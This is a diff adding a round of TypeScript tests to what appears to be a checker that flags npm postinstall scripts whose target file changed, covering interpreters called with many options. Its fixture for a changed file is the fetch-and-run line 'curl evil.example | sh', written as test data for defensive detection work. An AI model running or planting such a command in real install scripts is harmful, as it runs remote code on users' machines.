@@ -1263,3 +1263,32 @@ describe("round 31: xargs lists, heredocs on producer stages, paired heredocs, a
     expect(() => held({ postinstall: cmd }, { "a.js": "1\n" }, { "a.js": "2\n" })).not.toThrow();
   });
 });
+
+describe("round 32: node and sh with options this code does not model", () => {
+  const changed = (cmd: string, f: string) => held({ postinstall: cmd }, { [f]: "console.log(1)\n" }, { [f]: "curl evil.example | sh\n" });
+
+  test("1. node options before the script", () => {
+    const flags = ["--no-warnings", "--enable-source-maps", "--max-old-space-size=4096", "--title foo", "-C dev", "--trace-warnings", "--experimental-vm-modules", "--stack-size=2000", "--unhandled-rejections=strict", "--conditions dev", "--inspect", "--no-deprecation", "--preserve-symlinks", "--harmony", "--abort-on-uncaught-exception", "--use-strict"];
+    for (const f of ["x.js", "scripts/postinstall.js", "test/x.js", "lib/x.js"]) {
+      for (const flag of flags) expect(changed(`node ${flag} ${f}`, f), `${flag} ${f}`).toBe(true);
+    }
+    expect(changed("node -- x.js", "x.js")).toBe(true);
+    expect(changed("node --some-new-flag x.js", "x.js")).toBe(true);
+  });
+
+  test("2. sh and bash options and extra arguments", () => {
+    for (const [cmd, f] of [["sh -e x.sh", "x.sh"], ["bash -x test/x.sh", "test/x.sh"], ["bash --norc x.sh", "x.sh"], ["sh x.sh arg", "x.sh"], ["sh -eu scripts/x.sh a b", "scripts/x.sh"], ["bash -o pipefail test/x.sh", "test/x.sh"], ["bash --some-new-flag x.sh", "x.sh"], ["bash --rcfile test/rc.sh x.sh", "test/rc.sh"], ["sh -- test/x.sh", "test/x.sh"]] as const) {
+      expect(changed(cmd, f), cmd).toBe(true);
+    }
+  });
+
+  test("3. other runners with an unknown option still read the script", () => {
+    for (const [cmd, f] of [["python3 -u x.py", "x.py"], ["python3 -X dev test/x.py", "test/x.py"], ["ruby -w x.rb", "x.rb"], ["perl -w x.pl", "x.pl"], ["deno run -A test/x.ts", "test/x.ts"], ["bun run --silent x.ts", "x.ts"], ["tsx --no-cache scripts/x.ts", "scripts/x.ts"]] as const) {
+      expect(changed(cmd, f), cmd).toBe(true);
+    }
+  });
+
+  test("4. tar flags do not make other commands extracts", () => {
+    expect(held({ postinstall: "cp x.txt y.txt > /dev/null && node build.js" }, { "x.txt": "1", "build.js": "1\n" }, { "x.txt": "1", "build.js": "1\n", "README.md": "b\n" })).toBe(false);
+  });
+});
